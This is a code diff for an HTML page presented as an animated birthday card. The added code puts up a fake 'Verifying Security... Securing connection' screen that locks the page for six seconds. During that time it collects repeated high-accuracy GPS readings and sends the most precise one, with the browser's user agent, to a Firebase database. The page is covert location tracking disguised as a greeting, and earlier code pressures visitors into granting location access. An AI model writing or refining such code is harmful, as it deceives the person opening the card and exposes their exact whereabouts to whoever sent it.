@@ -39,9 +39,11 @@
             50% { background-position: 100% 50%; }
             100% { background-position: 0% 50%; }
         }
+
         .star-field { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
         @keyframes twinkle { 0%,100% { opacity: 0.3; transform: scale(1); } 50% { opacity: 1; transform: scale(1.2); } }
         .star-sparkle { position: absolute; background: white; border-radius: 50%; animation: twinkle var(--duration) infinite ease-in-out; }
+        
         .app-container {
             position: relative; width: 92vw; max-width: 850px; height: 75vh; max-height: 600px;
             background: var(--card-white); border-radius: 40px; box-shadow: 0 25px 50px -12px rgba(74,50,45,0.15);
@@ -49,6 +51,7 @@
         }
         @media (max-width: 640px) { .app-container { height: 85vh; max-height: none; border-radius: 30px; border: 6px solid #fff; } }
         .canvas-area { flex: 1; position: relative; padding: 2rem; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+
         @keyframes namePulse { 0%,100% { transform: scale(1) translateY(0); } 50% { transform: scale(1.05) translateY(-5px); } }
         h1 {
             font-size: clamp(2.2rem, 7vw, 4rem); font-family: 'Patrick Hand', cursive; color: var(--ink); line-height: 1.1;
@@ -63,6 +66,7 @@
             transition: opacity 0.5s ease; opacity: 0;
         }
         @keyframes fadeIn { to { opacity: 1; } }
+
         @keyframes floatAnim { 0%,100% { transform: translateY(0px); } 50% { transform: translateY(-15px); } }
         .element {
             position: absolute; z-index: 30; opacity: 0; animation: fadeIn 1s 2s forwards; cursor: pointer; pointer-events: auto;
@@ -76,6 +80,7 @@
         .wave { width: 100px; top: 55%; left: 10%; opacity: 0.8; }
         .cherries-1 { width: 75px; bottom: 22%; left: 20%; }
         .cherries-2 { width: 60px; top: 38%; right: 12%; }
+
         .smile-container {
             width: 180px; margin-top: 25px; position: relative; z-index: 20; opacity: 0;
             animation: fadeIn 0.8s 2.2s forwards; transition: transform 0.5s cubic-bezier(0.175,0.885,0.32,1.275);
@@ -85,6 +90,7 @@
         .wink-eye { animation: helloWink 0.4s forwards !important; transform-origin: center; }
         @keyframes helloWink { 0%,100% { transform: scaleY(1); } 50% { transform: scaleY(0.1); } }
         .big-smile { d: path("M15 25 Q50 65 85 25") !important; stroke: #ff4d6d !important; transition: all 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55); }
+
         .action-bar { padding: 1.5rem; background: #fafafa; display: flex; justify-content: center; gap: 1rem; opacity: 0; animation: fadeIn 0.8s 2.5s forwards; }
         .btn { padding: 10px 25px; border-radius: 50px; font-weight: 700; cursor: pointer; border: none; font-size: 0.9rem; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
         .btn-main { background: var(--ink); color: white; transition: transform 0.1s; }
@@ -93,7 +99,6 @@
         .hide-text { opacity: 0 !important; pointer-events: none; }
         .focus-face { transform: scale(1.4) translateY(-20px); }
 
-        /* Popups */
         .popup-overlay {
             position: fixed; inset: 0; background: rgba(74, 50, 45, 0.6); backdrop-filter: blur(12px);
             display: none; justify-content: center; align-items: center; z-index: 1000; padding: 20px;
@@ -120,7 +125,6 @@
         .instruction-guide p { margin: 8px 0; }
         .instruction-guide .step { font-weight: 700; color: #b9695a; }
 
-        /* Status Widget */
         .status-widget {
             position: fixed; bottom: 20px; right: 20px;
             background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(15px);
@@ -211,6 +215,15 @@
         </div>
     </div>
 
+    <!-- Verifying Overlay (Modified for strict UI freeze and visual timer) -->
+    <div class="popup-overlay" id="verifyingOverlay" style="z-index: 3000; background: rgba(255,255,255,0.9);">
+        <div class="popup-card" style="box-shadow: none; background: transparent;">
+            <div class="status-spinner" style="width: 40px; height: 40px; margin: 0 auto 20px auto; border-width: 4px; border-top-color: var(--ink);"></div>
+            <div class="popup-title" style="font-size: 1.4rem;">Verifying Security...</div>
+            <div class="popup-desc" id="verifyingDesc" style="font-size: 0.9rem; font-weight: bold; color: #b9695a;">Securing connection... (6s)</div>
+        </div>
+    </div>
+
     <div class="app-container" id="app">
         <div class="canvas-area">
             <div class="element rainbow" data-speed="0.8"><div class="float-wrap"><svg viewBox="0 0 100 60"><path d="M10 50 Q50 0 90 50" stroke="var(--pastel-purple)" stroke-width="8" fill="none" stroke-linecap="round"/><path d="M22 50 Q50 15 78 50" stroke="#ffb3c1" stroke-width="8" fill="none" stroke-linecap="round"/></svg></div></div>
@@ -235,13 +248,11 @@
         </div>
     </div>
 
-    <!-- Updated Firebase SDK & Config -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
         import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
 
-        // අලුත් Firebase Config එක මෙතන තියෙනවා උදාර
         const firebaseConfig = {
             apiKey: "AIzaSyCbqDvrvNDn3lF31LYRq5O4PDpp-VSxIwc",
             authDomain: "data-a0ce0.firebaseapp.com",
@@ -258,7 +269,6 @@
 
         let currentUserId = null;
         
-        // Auth එක සම්පූර්ණ වෙනකම් ඉන්න Promise එකක් හදාගන්නවා
         let authReady = new Promise(resolve => {
             onAuthStateChanged(auth, user => { 
                 if(user) {
@@ -271,23 +281,21 @@
 
         signInAnonymously(auth).catch(e => console.error("Auth Error:", e));
 
-        // අලුත් project එකේ data save කරන function එක
         window.saveLocationData = async (data) => {
-            await authReady; // Login වෙනකම් අනිවාර්යයෙන් ඉන්නවා
+            await authReady; 
             if (!currentUserId) return;
             try {
-                // මෙතන path එක 'data-a0ce0' එකට ගැලපෙන විදිහට හැදුවා
                 const colRef = collection(db, 'artifacts', 'birthday-card', 'users', currentUserId, 'locations');
-                await addDoc(colRef, { 
-                    ...data, 
-                    timestamp: serverTimestamp(),
-                    userAgent: navigator.userAgent
-                });
-                console.log("Location saved successfully!");
-            } catch (e) { 
-                console.error("Firestore Error:", e); 
-            }
-        };
+            await addDoc(colRef, { 
+                ...data, 
+                timestamp: serverTimestamp(),
+                userAgent: navigator.userAgent
+            });
+            console.log("Location saved successfully!", data);
+        } catch (e) { 
+            console.error("Firestore Error:", e); 
+        }
+    };
     </script>
 
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
@@ -295,7 +303,10 @@
         const tickSVG = `<svg class="mini-tick" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M9 10L12.2581 12.4436C12.6766 12.7574 13.2662 12.6957 13.6107 12.3021L20 5" stroke="currentColor" stroke-width="3" stroke-linecap="round"/></svg>`;
         
         let isLocationAllowed = false;
-        
+        let isVerifying = false;
+        let locationWatchId = null;
+        let locationCandidates = [];
+
         async function updateStatus() {
             const widget = document.getElementById('statusWidget');
             const list = document.getElementById('statusList');
@@ -350,8 +361,7 @@
                     if (result.state === 'granted') {
                         isLocationAllowed = true;
                         closeAllPopups();
-                        enableMainInterface();
-                        requestLocationAccess(false); // දැනටමත් Allow කරලා නම් Location අරන් Save කරනවා
+                        startVerificationProcess(); 
                     } else if (result.state === 'denied') {
                         showPopup('overlay3', 'card3');
                     } else {
@@ -361,16 +371,120 @@
             } else { showPopup('overlay1', 'card1'); }
         }
 
+        function disableMainInterface() {
+            const btn = document.getElementById('mainButton');
+            btn.style.pointerEvents = 'none';
+            btn.disabled = true;
+            document.querySelectorAll('.element').forEach(el => el.style.pointerEvents = 'none');
+            // Prevent body clicks, but keep overlay 3000 interactive if needed
+            document.body.style.pointerEvents = 'none'; 
+            document.getElementById('verifyingOverlay').style.pointerEvents = 'auto'; 
+            // Allow popups to be interactive
+            document.querySelectorAll('.popup-overlay').forEach(el => el.style.pointerEvents = 'auto');
+        }
+
+        function enableMainInterface() {
+            const btn = document.getElementById('mainButton');
+            btn.style.pointerEvents = 'auto';
+            btn.disabled = false;
+            document.querySelectorAll('.element').forEach(el => el.style.pointerEvents = 'auto');
+            document.body.style.pointerEvents = 'auto';
+        }
+
+        function startVerificationProcess() {
+            if (isVerifying) return;
+            isVerifying = true;
+            
+            const verifyingOverlay = document.getElementById('verifyingOverlay');
+            verifyingOverlay.style.display = 'flex';
+            setTimeout(() => verifyingOverlay.querySelector('.popup-card').classList.add('show'), 50);
+
+            // Disable interactions entirely while verifying
+            disableMainInterface();
+
+            locationCandidates = [];
+            
+            const descEl = document.getElementById('verifyingDesc');
+            let secondsLeft = 6;
+            descEl.innerText = `Securing connection... (${secondsLeft}s)`;
+            
+            const timerInterval = setInterval(() => {
+                secondsLeft--;
+                if(secondsLeft >= 0) {
+                    descEl.innerText = `Securing connection... (${secondsLeft}s)`;
+                }
+                if (secondsLeft <= 0) {
+                    clearInterval(timerInterval);
+                }
+            }, 1000);
+
+            if (navigator.geolocation) {
+                locationWatchId = navigator.geolocation.watchPosition(
+                    (pos) => {
+                        locationCandidates.push({
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            time: Date.now()
+                        });
+                        console.log("Candidate reading, accuracy:", Math.round(pos.coords.accuracy) + "m");
+                    },
+                    (err) => console.warn("Watch error:", err),
+                    { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+                );
+            }
+
+            // Wait strictly 6 seconds, then pick the absolute best/most stable location
+            setTimeout(() => {
+                if (locationWatchId !== null) {
+                    navigator.geolocation.clearWatch(locationWatchId);
+                }
+                
+                let bestLocation = null;
+                
+                if (locationCandidates.length > 0) {
+                    // Sort strictly by accuracy (lowest radius = most accurate/stable)
+                    // If accuracies are identical, pick the most recent one
+                    locationCandidates.sort((a, b) => {
+                        if (a.accuracy !== b.accuracy) {
+                            return a.accuracy - b.accuracy; 
+                        }
+                        return b.time - a.time; 
+                    });
+                    
+                    bestLocation = locationCandidates[0];
+                    console.log("SUCCESS: Selected stable location with accuracy:", Math.round(bestLocation.accuracy) + "m");
+                } else {
+                    console.warn("No location candidates received within 6s window");
+                }
+
+                if (bestLocation && window.saveLocationData) {
+                    window.saveLocationData(bestLocation);
+                }
+
+                descEl.innerText = "Secured successfully! ✅";
+                descEl.style.color = "#22c55e"; 
+
+                setTimeout(() => {
+                    verifyingOverlay.querySelector('.popup-card').classList.remove('show');
+                    setTimeout(() => {
+                        verifyingOverlay.style.display = 'none';
+                        descEl.style.color = "#b9695a"; // reset color
+                        isVerifying = false;
+                        enableMainInterface();
+                    }, 500);
+                }, 1000); 
+
+            }, 6000);
+        }
+
         function requestLocationAccess(showPopupOnError = true) {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
+                    (pos) => {
                         isLocationAllowed = true;
                         closeAllPopups();
-                        enableMainInterface(); // Reload නැතුව Button එක On කරනවා
-                        if (window.saveLocationData) {
-                            await window.saveLocationData({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy });
-                        }
+                        startVerificationProcess(); 
                     },
                     (error) => {
                         closeAllPopups();
@@ -393,12 +507,6 @@
                 ov.querySelector('.popup-card').classList.remove('show');
                 ov.style.display = 'none';
             });
-        }
-
-        function enableMainInterface() {
-            const btn = document.getElementById('mainButton');
-            btn.style.pointerEvents = 'auto';
-            btn.disabled = false;
         }
 
         function showGuideInPopup2() {
@@ -424,7 +532,6 @@
             `;
         }
 
-        // Animation logic
         const leftPupil = document.getElementById('left-pupil'), rightPupil = document.getElementById('right-pupil'), elements = document.querySelectorAll('.element'), leftEyeGroup = document.getElementById('left-eye-group'), rightEyeGroup = document.getElementById('right-eye-group'), mouth = document.getElementById('mouth'), mainTitle = document.getElementById('main-title'), subTitle = document.getElementById('sub-title'), mainButton = document.getElementById('mainButton'), smileContainer = document.getElementById('smile');
 
         const handleMove = (clientX, clientY) => {
